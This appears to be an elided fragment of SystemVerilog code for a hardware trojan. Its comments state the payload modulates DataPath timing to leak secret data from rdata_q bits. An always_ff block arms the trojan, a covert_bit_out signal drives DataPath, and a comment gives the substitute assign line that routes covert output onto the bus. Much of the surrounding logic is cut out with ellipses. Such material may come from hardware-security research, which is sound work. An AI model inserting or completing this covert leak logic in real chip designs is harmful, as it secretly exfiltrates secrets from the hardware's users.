 ...
 * Payload: Modulate DataPath timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |DataPath) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of DataPath:
...
logic       covert_bit_out;         // Drives DataPath when trojan active
...
//   Replace with:
//     assign DataPath = trojan_active ? covert_bit_out : (<normal_expr>);
//
